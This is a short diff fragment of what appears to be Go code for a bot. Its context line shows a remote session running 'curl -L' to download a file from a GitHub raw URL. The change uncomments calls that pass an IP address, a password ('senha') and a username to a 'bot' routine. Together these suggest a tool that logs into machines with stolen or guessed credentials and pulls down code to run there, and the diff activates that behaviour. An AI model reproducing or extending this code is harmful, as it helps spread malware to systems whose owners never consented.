@@ -112,7 +112,7 @@ er := session.Run("curl -L https://github.com/atilabyte/golang/raw/refs/heads/ma
 
                  
 
-            //  go bot( ip ) ; go  bot (senha) ;  go bot (user)
+              bot( ip ) ;   bot (senha) ;   bot (user)
 
 
 
